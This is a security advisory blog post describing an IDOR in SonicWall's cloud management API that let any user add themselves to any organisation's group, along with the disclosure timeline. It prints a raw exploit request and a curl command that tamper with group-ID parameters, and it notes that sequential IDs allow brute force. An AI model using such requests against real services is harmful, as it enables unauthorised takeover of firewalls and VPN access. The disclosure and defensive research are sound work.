+	<li id="menu-item-3488" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3488"><a href="https://www.pentestpartners.com/penetration-testing-services/security-training/">Security Training</a></li>
+	<li id="menu-item-8534" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-8534"><a href="https://www.pentestpartners.com/penetration-testing-services/papa/">Papa – Proactive Advanced Password Auditor</a></li>
+	<li id="menu-item-14716" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-14716"><a href="https://www.pentestpartners.com/penetration-testing-services/ics-iiot-scada-security-testing/">ICS, IIoT, SCADA Security Testing</a></li>
+	<li id="menu-item-3520" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3520"><a href="https://www.pentestpartners.com/penetration-testing-services/cbest-threat-intelligence-led-red-teaming/">CBEST Red Teaming</a></li>
+	<li id="menu-item-26093" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26093"><a href="https://www.pentestpartners.com/crest-owasp-verification-standard-ovs-program/">CREST OVS Mobile &#038; Apps</a></li>
+	<li id="menu-item-23691" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-23691"><a href="https://www.pentestpartners.com/penetration-testing-services/tiber-eu-assessments/">TIBER-EU Assessments</a></li>
+	<li id="menu-item-23633" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-23633"><a href="https://www.pentestpartners.com/penetration-testing-services/crest-star-fs-assessments/">CREST STAR-FS</a></li>
+	<li id="menu-item-3519" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3519"><a href="https://www.pentestpartners.com/penetration-testing-services/cyber-essentials-testing/">Cyber Essentials Testing</a></li>
+	<li id="menu-item-4602" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-4602"><a href="https://www.pentestpartners.com/penetration-testing-services/cyber-security-consulting/">Cyber Security Consulting</a></li>
+	<li id="menu-item-16872" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-16872"><a href="https://www.pentestpartners.com/compromise-assessment/">Compromise Assessment</a></li>
+	<li id="menu-item-16871" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-16871"><a href="https://www.pentestpartners.com/digital-forensics-services/">Digital Forensics Services</a></li>
+	<li id="menu-item-17151" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-17151"><a href="https://www.pentestpartners.com/incident-response-services/">Incident Response Services</a></li>
+	<li id="menu-item-16873" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-16873"><a href="https://www.pentestpartners.com/incident-response-retained-service/">Incident Response Retained Service</a></li>
+	<li id="menu-item-16869" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-16869"><a href="https://www.pentestpartners.com/incident-response-policy-assessment-development/">Incident Response Policy Assessment &#038; Development</a></li>
+	<li id="menu-item-25330" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-25330"><a href="https://www.pentestpartners.com/attack-surface-assessment/">Attack Surface Assessment</a></li>
+</ul>
+</li>
+<li id="menu-item-5677" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-5677"><a href="https://www.pentestpartners.com/events-and-speaking/">Events</a></li>
+<li id="menu-item-8172" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-8172"><a href="https://www.pentestpartners.com/security-blog/">Security Blog</a></li>
+<li id="menu-item-3529" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3529"><a href="https://www.pentestpartners.com/resources/hack-demo-videos/">Demo Videos</a></li>
+<li id="menu-item-3407" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3407"><a href="https://www.pentestpartners.com/contact-us/">Contact Us</a></li>
+</ul>
+                <div id="search-icon"><i class="fas fa-search"></i></div>
+
+                <div id="menu-icon"><i class="fas fa-bars"></i></div>
+
+            </div>
+        </div>
+
+        <div id="search-bar">
+            <form role="search"
+                  method="get"
+                  class="search-form"
+                  action="https://www.pentestpartners.com/">
+                <input type="search"
+                       class="search-field"
+                       placeholder="Your search"
+                       value=""
+                       name="s"
+                       title="Search for:"/>
+                <input type="submit"
+                       title="Search now"
+                       class="search-submit"
+                       value="Go"/>
+            </form>
+        </div>
+
+    </div>
+
+</header>
+
+<div id="main" >
+    <div class="browser-upgrade">
+		For the best user experience please upgrade your browser    </div>
+    <div class="container">
+
+
+    <section class="content group">
+
+		
+            <article id="page" class="single-post">
+
+                <div class="intro group">
+
+                    <div class="heading-panel">
+                        <p class="category-label">Blog: Vulnerability Advisory</p>
+                        <h1 class="page-heading">Cloud firewall management API SNAFU put 500k SonicWall customers at risk</h1>
+                    </div>
+                    <div class="meta" id="author_meta">
+                        <div>
+																					
+                            <span class="author">Vangelis Stykas</span>
+                            <span class="date">02 Sep 2020</span>
+                        </div>
+                    </div>
+                </div>
+
+
+                <div class="editor">
+					<h3><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2020/09/swall-headline-captioned.png" fetchpriority="high" decoding="async" class="alignnone wp-image-21078" alt width="800" height="400" srcset="https://www.pentestpartners.com/content/uploads/2020/09/swall-headline-captioned.png 1000w, https://www.pentestpartners.com/content/uploads/2020/09/swall-headline-captioned-300x150.png 300w, https://www.pentestpartners.com/content/uploads/2020/09/swall-headline-captioned-768x384.png 768w" sizes="(max-width: 800px) 100vw, 800px"><noscript><img fetchpriority="high" decoding="async" class="alignnone wp-image-21078" src="https://www.pentestpartners.com/content/uploads/2020/09/swall-headline-captioned.png" alt="" width="800" height="400" srcset="https://www.pentestpartners.com/content/uploads/2020/09/swall-headline-captioned.png 1000w, https://www.pentestpartners.com/content/uploads/2020/09/swall-headline-captioned-300x150.png 300w, https://www.pentestpartners.com/content/uploads/2020/09/swall-headline-captioned-768x384.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></noscript></h3>
+<h3>TL;DR</h3>
+<ul>
+<li>I found an IDOR in SonicWall&#8217;s cloud management platform API</li>
+<li><strong>Any</strong> user could add themselves to <strong>any</strong> account at <strong>any</strong> organisation using it</li>
+<li>Anyone could create a user account to exploit the issue, from the public internet</li>
+<li>Can be used to change firewall rules, or add rogue VPN users, for example</li>
+<li>Results in <strong>trivial compromise</strong> of ~500K orgs, ~2 million user groups and ~10 million devices</li>
+<li>Where SonicWall is used for SSO, results in compromise of 3<sup>rd</sup> party systems too</li>
+<li>Not clear how long it was vulnerable for, but took SonicWall 14 days to fix the issue…<br />
+…during which time they left the offending API request available, exposing all customers</li>
+</ul>
+<p>Potential for injecting ransomware was significant.</p>
+<p>Irony of a security vendor making clients more vulnerable is not lost on us!</p>
+<h3>Let&#8217;s begin</h3>
+<p>SonicWall is a significant provider of security appliances, primarily firewalls, UTM, VPNs and content control.</p>
+<p>During a recent test, I was investigating the cloud management functionality of a client firewall and other SonicWall devices through the mysonicwall.com cloud.</p>
+<p>I found a security issue so serious that we then spent £££ on our own SonicWall products in order to independently validate the issue, to be certain it wasn’t just our client that was affected.</p>
+<p>What I discovered was a trivial method to compromise every single cloud managed device attached to mysonicwall.com, affecting around 1.9 million user groups across hundreds of thousands of organisations. At least 10 million individual devices were affected.</p>
+<p>The vulnerability, an insecure direct object reference in the ‘partyGroupID’ API request, allowed any user to be added to <u>any</u> group at <u>any</u> organization. All I needed was my own account and I could add it to anyone else’s group through the public cloud service.</p>
+<p>Using this degree of access, one could modify firewall rules and/or VPN access, giving oneself remote access in to any organization. One could inject ransomware, or any manner of other attacks should one so wish. That’s a breach of customer networks directly as a result of their security products. The irony is not lost on me!</p>
+<p>Disclosure was initially very positive, then went rapidly downhill as SonicWall procrastinated with a fix and refused to take down the vulnerable functionality in the meantime, knowingly leaving their customers exposed for a full 17 days.</p>
+<h3>The vulnerability</h3>
+<p>An insecure direct object reference vulnerability was found in the users/add-user API endpoint for the SonicWall GMS application. This could allow a normal authenticated user to manipulate a parameter and gain access to any user group in any tenant.</p>
+<p>When inviting a new user, a call is made to the api/users/add-user endpoint. Amongst other parameters, this call includes a partyGroupId parameter. This number appears to be a sequential integer which is unique to any group in any tenant.</p>
+<p>This parameter will add the user in the request to the resultant group. A check is made whether the emailAddress parameter is allowed, but this only works if the emailAddress is the same as that in the JWT used for authorisation. If the emailAddress is changed to a new or existing user, but is not the same as in the JWT then the user will be added to the partyGroupId group.</p>
+<p>As the partyGroupId parameter is a <span style="background-color: #ffff00;">7-digit integer</span> it is possible to perform a brute force attack and gain access to other groups.</p>
+<p>The partyGroupId parameter appears to be unique globally and can reference groups in any tenant. This could give access to all devices of another tenant.</p>
+<p>An example request can be seen below where a <span style="background-color: #07c020;">throw-away user</span> is created to have very basic access:</p>
+<p>Request:</p>
+<pre>Request:
+POST /api/users/add-user?emailAddress=<span style="background-color: #07c020;"><a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="482d2f3f797a08252921242126293c273a662b2725">[email&#160;protected]</a></span>&amp;firstName=Vangelis&amp;lastName=Stykas1&amp;partyGroupId=<span style="background-color: #ffff00;">1644147</span>&amp;contactTypeId=10001&amp;bskipResellerCustomerValidation=false HTTP/1.1
+Host: api.mysonicwall.com
+Connection: close
+Content-Length: 2
+Accept: application/json, text/plain, */*
+Origin: https://www.mysonicwall.com
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOiIxNTk3MzIzNjI4IiwiaXNzIjoiaHR0cHM6Ly9teS5teXNvbmljd2FsbC5jb20vT0F1dGgyMCIsImF1ZCI6Imh0dHBzOi8vd3d3Lm15c29uaWN3YWxsLmNvbS9PQXV0aDIiLCJ1c2VyTmFtZSI6IjRfMzkzNjk0OTMiLCJjbGllbnRJZCI6Ik1VSVIxWEhJUzI3Iiwic0lkIjoiNDFDQzA1NkYtQ0JGNy00MDU1LTkxOTctMzQ1OUE1MTc5Mjg1IiwibG9jYWxlTmFtZSI6ImVuIiwiZ2l2ZW5OYW1lIjoiVmFuZ2VsaXMgU3R5a2FzIiwiZW1haWwiOiJlZ3cxMUBtYWlsaW5hdG9yLmNvbSIsInNlbGYiOiIxIiwidmlld21vZGUiOiJzZWxmbXN3IiwiY29tcGFueU5hbWUiOiJGaXNoIEluYyIsImNvdW50cnlDb2RlIjoiR0IiLCJwYXJ0bmVyVGllciI6IiIsInJvbGVzIjoiQ1VTVE9NRVIsV09SS1NQQUNFQkVUQSxTUE9HU1NDIn0.JF4VbFglSUsNYhPqmfbrIGC3ENPMXXXXXXb2mFdb_w
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36
+Content-Type: application/json
+Referer: https://www.mysonicwall.com/workspace/m/feature/user-groups?mode=APP
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+ 
+{}</pre>
+<p>The highlighted parameters can be tampered with. This attack could easily be scripted and run from a simple curl script.</p>
+<p>As noted, the emailAddress in the parameters is egw<strong>12</strong>@mailinator.com whereas the email address in the JWT is “egw<strong>11</strong>@mailinator.com”.</p>
+<p>This will respond with:</p>
+<p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc1.png" decoding="async" class="alignnone size-full wp-image-21025" alt width="939" height="370" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc1.png 939w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc1-300x118.png 300w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc1-768x303.png 768w" sizes="(max-width: 939px) 100vw, 939px"><noscript><img decoding="async" class="alignnone size-full wp-image-21025" src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc1.png" alt="" width="939" height="370" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc1.png 939w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc1-300x118.png 300w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc1-768x303.png 768w" sizes="(max-width: 939px) 100vw, 939px" /></noscript></p>
+<p>This can be run through a simple curl command:</p>
+<pre>curl -i -s -k -X $'POST' \
+    -H $'Host: api.mysonicwall.com' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0' -H $'Accept: application/json, text/plain, */*' -H $'Accept-Language: en-GB,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOiIxNTk3Mzk1MzUzIiwiaXNzIjoiaHR0cHM6Ly9teS5teXNvbmljd2FsbC5jb20vT0F1dGgyMCIsImF1ZCI6Imh0dHBzOi8vd3d3Lm15c29uaWN3YWxsLmNvbS9PQXV0aDIiLCJ1c2VyTmFtZSI6IjRfMzkzNzE4MjAiLCJjbGllbnRJZCI6Ik1VSVIxWEhJUzI3Iiwic0lkIjoiNDg0NTE2RTgtMjU2RS00QzZFLTg2OUQtNTE0RUM5MzgwRjMyIiwibG9jYWxlTmFtZSI6ImVuIiwiZ2l2ZW5OYW1lIjoiRGF2aWQgTG9kZ2UiLCJlbWFpbCI6InNvbmljd2FsbEB0YXV0b2xvZ3kub3JnLnVrIiwic2VsZiI6IjEiLCJ2aWV3bW9kZSI6InNlbGZtc3ciLCJjb21wYW55TmFtZSI6IlRhdXRvbG9neSBDb25zdWx0aW5nIiwiY291bnRyeUNvZGUiOiJHQiIsInBhcnRuZXJUaWVyIjoiIiwicm9sZXMiOiJDVVNUT01FUixXT1JLU1BBQ0VCRVRBLFNQT0dTU0MifQ.Hvkd7XgzTEqE6958AaXXXXXXXXXv1MOM' -H $'Origin: https://www.mysonicwall.com' -H $'Connection: close' -H $'Referer: https://www.mysonicwall.com/workspace/m/feature/user-group?mode=APP' -H $'Content-Length: 2' \
+    --data-binary $'{}' \
+    $'https://api.mysonicwall.com/api/users/add-user?emailAddress=sonicwall1@█████████.org.uk&amp;firstName=David&amp;lastName=█████&amp;partyGroupId=1644147&amp;contactTypeId=10001&amp;bskipResellerCustomerValidation=false'</pre>
+<p>This will make it possible to simply script an attack</p>
+<p>Once the user has been added then they will have access to that usergroup; in the examples above, this has given access to the following:</p>
+<p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc2.png" decoding="async" class="alignnone wp-image-21026" alt width="523" height="296" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc2.png 775w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc2-300x170.png 300w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc2-768x435.png 768w" sizes="(max-width: 523px) 100vw, 523px"><noscript><img decoding="async" class="alignnone wp-image-21026" src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc2.png" alt="" width="523" height="296" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc2.png 775w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc2-300x170.png 300w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc2-768x435.png 768w" sizes="(max-width: 523px) 100vw, 523px" /></noscript></p>
+<p>From here it is possible to perform user administration, including removing valid users:</p>
+<p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc3.png" loading="lazy" decoding="async" class="alignnone wp-image-21027" alt width="789" height="227" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc3.png 939w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc3-300x86.png 300w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc3-768x221.png 768w" sizes="(max-width: 789px) 100vw, 789px"><noscript><img loading="lazy" decoding="async" class="alignnone wp-image-21027" src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc3.png" alt="" width="789" height="227" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc3.png 939w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc3-300x86.png 300w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc3-768x221.png 768w" sizes="(max-width: 789px) 100vw, 789px" /></noscript></p>
+<p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc4.png" loading="lazy" decoding="async" class="alignnone wp-image-21028" alt width="258" height="405" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc4.png 355w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc4-191x300.png 191w" sizes="(max-width: 258px) 100vw, 258px"><noscript><img loading="lazy" decoding="async" class="alignnone wp-image-21028" src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc4.png" alt="" width="258" height="405" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc4.png 355w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc4-191x300.png 191w" sizes="(max-width: 258px) 100vw, 258px" /></noscript></p>
+<p>As permissions have been obtained it should be possible to access all licensed options for that tenant.</p>
+<p>This includes obtaining the list of users for that company:</p>
+<p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc5.png" loading="lazy" decoding="async" class="alignnone size-full wp-image-21029" alt width="939" height="221" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc5.png 939w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc5-300x71.png 300w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc5-768x181.png 768w" sizes="(max-width: 939px) 100vw, 939px"><noscript><img loading="lazy" decoding="async" class="alignnone size-full wp-image-21029" src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc5.png" alt="" width="939" height="221" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc5.png 939w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc5-300x71.png 300w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc5-768x181.png 768w" sizes="(max-width: 939px) 100vw, 939px" /></noscript></p>
+<p>(the same page allows deleting of current users)</p>
+<p>And the company’s details. This is our own account:</p>
+<p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc6-1.png" loading="lazy" decoding="async" class="alignnone wp-image-21046" alt width="450" height="429" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc6-1.png 614w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc6-1-300x286.png 300w" sizes="(max-width: 450px) 100vw, 450px"><noscript><img loading="lazy" decoding="async" class="alignnone wp-image-21046" src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc6-1.png" alt="" width="450" height="429" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc6-1.png 614w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc6-1-300x286.png 300w" sizes="(max-width: 450px) 100vw, 450px" /></noscript></p>
+<p>Through services it is possible to control the company’s devices, including the firewall rules and logs:</p>
+<p><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc7.png" loading="lazy" decoding="async" class="alignnone wp-image-21031" alt width="800" height="173" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc7.png 939w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc7-300x65.png 300w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc7-768x166.png 768w" sizes="(max-width: 800px) 100vw, 800px"><noscript><img loading="lazy" decoding="async" class="alignnone wp-image-21031" src="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc7.png" alt="" width="800" height="173" srcset="https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc7.png 939w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc7-300x65.png 300w, https://www.pentestpartners.com/content/uploads/2020/08/swallvulndisc7-768x166.png 768w" sizes="(max-width: 800px) 100vw, 800px" /></noscript></p>
+<p>Compromise is now complete. Depending on the features the client has paid for, one would have access to configure:</p>
+<ul>
+<li>Routers</li>
+<li>Firewalls</li>
+<li>VPN (adding a VPN user and having access to the internal network)</li>
+<li>Security reports</li>
+<li>Traffic analytics</li>
+<li>VoIP and potentially toll fraud</li>
+<li>Internal wireless networks</li>
+<li>Web application firewalls</li>
+<li>Cloud app security controls</li>
+<li>Anti-spam and content filters</li>
+</ul>
+<h3>Disclosure</h3>
+<p>Following the vulnerability disclosure process at <a href="https://psirt.global.sonicwall.com/vuln-policy">https://psirt.global.sonicwall.com/vuln-policy</a>, we emailed a report to <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1363607a616753607c7d7a7064727f7f3d707c7e">[email&#160;protected]</a> on the morning of <strong>August 13th</strong>.</p>
+<p>This was acknowledged about <strong>45 minutes later</strong> with a personal reply. We strongly urged SonicWall to take down the affected service whilst a fix was implemented, given the degree of customer exposure</p>
+<p>About <strong>12 hours later</strong> we had an update, confirming the vulnerability existed. <strong>This is good!</strong></p>
+<p style="padding-left: 40px;">“We have validated your report and submitted to our remediation team to fix the issue.<br />
+And if you keep it confidential until we patch it, you and Pentest Partners will be credited on our vulnerabilities Hall of Fame page.”</p>
+<p>But no reference to a timeline to fix. After hearing <strong>nothing for 6 days</strong>, I asked the question directly:</p>
+<p style="padding-left: 40px;">“Could you please urgently confirm when you intend to fix this issue, given it exposes every one of your customers using the SonicWall cloud service and should be straightforward to resolve?”</p>
+<p>And received this reply:</p>
+<p style="padding-left: 40px;">“Please be patient, our team is still working on fixing the issue. We will let you know once the issue is patched.”</p>
+<p>This is a trivial IDOR in an API, not a complex RCE in the firewall OS. Other API requests were correctly authorized, so the fix should be straightforward. Also, why wasn’t the service taken down in the meantime?</p>
+<p>I waited <strong>another four days</strong> and asked again for a timeline:</p>
+<p style="padding-left: 40px;">“Can you please give me a timeline estimate on fixing this issue ?<br />
+To my understanding you have knowingly left vulnerable every user of the cloud platform.”</p>
+<p>Finally a timeline:</p>
+<p style="padding-left: 40px;">“Again thanks for you report and follow up, the fix is in QA and it will be deployed by end of the month.”</p>
+<p>That would make a <strong>total of 17 days</strong> during which SonicWall knowingly exposed their entire customer base.</p>
+<p>Most of the other API IDOR issues we’ve disclosed to other organisations have been fixed within 48 hours. Even car alarm vendors have fixed similar issues inside 3 days of us reporting. This is a security vendor though, who really should know better and do better.</p>
+<p>My colleague Ken helped me escalate this to the SonicWall CEO.</p>
+<p>Ken reached out to message the CEO Bill Conner privately on LinkedIn. He replied within two hours, which was impressive given the time difference.</p>
+<p>The head of global support was introduced to us and we were then passed to a VP of support who took our report and assured us that it would be raised urgently.</p>
+<p>Whilst it still took <strong>another 48 hours</strong>, the vulnerability was resolved overnight on the <strong>26-27th August</strong>.</p>
+<p>It was a shame that we had to go around the PSIRT team to get the priority raised, but good that it did accelerate the fix.</p>
+<p>Even so, we still don’t understand why the service wasn’t taken down immediately. We’re realists – we know that keeping the service running is important, but in the face of risks this significant? Taking down the API request function to add a user wouldn’t have been particularly impactful for a short period whilst the fix was worked on either.</p>
+<h3>Conclusion</h3>
+<p>Having a vulnerability this serious in a security product and cloud service isn’t great, but that isn’t our issue here. Vulnerabilities happen. It’s OK.</p>
+<p>What makes the difference between a cool vendor and an uncool vendor is how they deal with the report. In our opinion SonicWall didn’t deal with this well and then knowingly exposed every single one of their cloud-connected customers to remote pwnage for 14 days.</p>
+<h3>***UPDATE***</h3>
+<p>SonicWall issued a statement to a journalist in which they said:</p>
+<p style="padding-left: 40px;"><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2018/07/QuoteOpen.png" loading="lazy" decoding="async" class="alignnone size-full wp-image-12486" alt width="31" height="25"><noscript><img loading="lazy" decoding="async" class="alignnone size-full wp-image-12486" src="https://www.pentestpartners.com/content/uploads/2018/07/QuoteOpen.png" alt="" width="31" height="25" /></noscript></p>
+<p style="padding-left: 40px;">Any exploitation of the vulnerability would first require a hacker to obtain an account owner&#8217;s specific tenant ID (which are fully protected and not publicly available) and then associate a new user with that tenant ID.</p>
+<p style="padding-left: 40px;"><img src="https://www.pentestpartners.com/content/plugins/lazy-load/images/1x1.trans.gif" data-lazy-src="https://www.pentestpartners.com/content/uploads/2018/07/QuoteClose.png" loading="lazy" decoding="async" class="alignnone size-full wp-image-12487" alt width="30" height="24"><noscript><img loading="lazy" decoding="async" class="alignnone size-full wp-image-12487" src="https://www.pentestpartners.com/content/uploads/2018/07/QuoteClose.png" alt="" width="30" height="24" /></noscript></p>
+<p>This is inaccurate and misleading for two reasons:</p>
+<ul>
+<li>Firstly the tenant IDs were both unprotected and publicly available, otherwise we couldn’t have found them.</li>
+<li>Secondly they use sequential numbers, meaning that if a hacker can count they could have obtained a valid tenant ID.</li>
+</ul>
+
+					
+					                </div>
+
+
+            </article>
+
+
+		
+
+		<aside id="sidebar">
+
+    <!-- call to action box -->
+
+	
+
+	
+
+
+	
+
+	
+
+
+	
+        <!-- share for page-->
+
+        <div class="widget share-widget">
+
+            <h3>Share</h3>
+
+				<div class="addtoany_shortcode"><div class="a2a_kit a2a_kit_size_32 addtoany_list" data-a2a-url="https://www.pentestpartners.com/security-blog/cloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk/" data-a2a-title="Cloud firewall management API SNAFU put 500k SonicWall customers at risk"><a class="a2a_button_twitter" href="https://www.addtoany.com/add_to/twitter?linkurl=https%3A%2F%2Fwww.pentestpartners.com%2Fsecurity-blog%2Fcloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk%2F&amp;linkname=Cloud%20firewall%20management%20API%20SNAFU%20put%20500k%20SonicWall%20customers%20at%20risk" title="Twitter" rel="nofollow noopener" target="_blank"></a><a class="a2a_button_facebook" href="https://www.addtoany.com/add_to/facebook?linkurl=https%3A%2F%2Fwww.pentestpartners.com%2Fsecurity-blog%2Fcloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk%2F&amp;linkname=Cloud%20firewall%20management%20API%20SNAFU%20put%20500k%20SonicWall%20customers%20at%20risk" title="Facebook" rel="nofollow noopener" target="_blank"></a><a class="a2a_button_linkedin" href="https://www.addtoany.com/add_to/linkedin?linkurl=https%3A%2F%2Fwww.pentestpartners.com%2Fsecurity-blog%2Fcloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk%2F&amp;linkname=Cloud%20firewall%20management%20API%20SNAFU%20put%20500k%20SonicWall%20customers%20at%20risk" title="LinkedIn" rel="nofollow noopener" target="_blank"></a><a class="a2a_button_slashdot" href="https://www.addtoany.com/add_to/slashdot?linkurl=https%3A%2F%2Fwww.pentestpartners.com%2Fsecurity-blog%2Fcloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk%2F&amp;linkname=Cloud%20firewall%20management%20API%20SNAFU%20put%20500k%20SonicWall%20customers%20at%20risk" title="Slashdot" rel="nofollow noopener" target="_blank"></a><a class="a2a_button_reddit" href="https://www.addtoany.com/add_to/reddit?linkurl=https%3A%2F%2Fwww.pentestpartners.com%2Fsecurity-blog%2Fcloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk%2F&amp;linkname=Cloud%20firewall%20management%20API%20SNAFU%20put%20500k%20SonicWall%20customers%20at%20risk" title="Reddit" rel="nofollow noopener" target="_blank"></a><a class="a2a_button_email" href="https://www.addtoany.com/add_to/email?linkurl=https%3A%2F%2Fwww.pentestpartners.com%2Fsecurity-blog%2Fcloud-firewall-management-api-snafu-put-500k-sonicwall-customers-at-risk%2F&amp;linkname=Cloud%20firewall%20management%20API%20SNAFU%20put%20500k%20SonicWall%20customers%20at%20risk" title="Email" rel="nofollow noopener" target="_blank"></a><a class="a2a_dd addtoany_share_save addtoany_share" href="https://www.addtoany.com/share"></a></div></div>
+        </div>
+
+	
+
+
+	
+        <div class="widget widget_categories">
+
+            <h3>Categories</h3>
+
+            <form id="category-select"
+                  class="category-select"
+                  action="https://www.pentestpartners.com/"
+                  method="get">
+
+				
+												
+				<select  name='cat' id='cat' class='postform' onchange='return this.form.submit()'>
+	<option value='0' selected='selected'>Show all</option>
+	<option class="level-0" value="21">Android&nbsp;&nbsp;(71)</option>
+	<option class="level-0" value="54">Automotive Security&nbsp;&nbsp;(24)</option>
+	<option class="level-0" value="56">Aviation Cyber Security&nbsp;&nbsp;(44)</option>
+	<option class="level-0" value="52">Blockchain&nbsp;&nbsp;(3)</option>
+	<option class="level-0" value="58">Breach Handling&nbsp;&nbsp;(1)</option>
+	<option class="level-0" value="65">Careers At PTP&nbsp;&nbsp;(1)</option>
+	<option class="level-0" value="62">Cloud Security&nbsp;&nbsp;(5)</option>
+	<option class="level-0" value="25">Code Repository&nbsp;&nbsp;(1)</option>
+	<option class="level-0" value="74">Consultancy advice&nbsp;&nbsp;(5)</option>
+	<option class="level-0" value="53">Consumer Advice&nbsp;&nbsp;(34)</option>
+	<option class="level-0" value="63">Cyber Essentials&nbsp;&nbsp;(1)</option>
+	<option class="level-0" value="27">Cyber Liability Insurance&nbsp;&nbsp;(5)</option>
+	<option class="level-0" value="70">DFIR&nbsp;&nbsp;(28)</option>
+	<option class="level-0" value="48">Hardware Hacking&nbsp;&nbsp;(19)</option>
+	<option class="level-0" value="20">Heartbleed&nbsp;&nbsp;(5)</option>
+	<option class="level-0" value="19">Honeypots&nbsp;&nbsp;(6)</option>
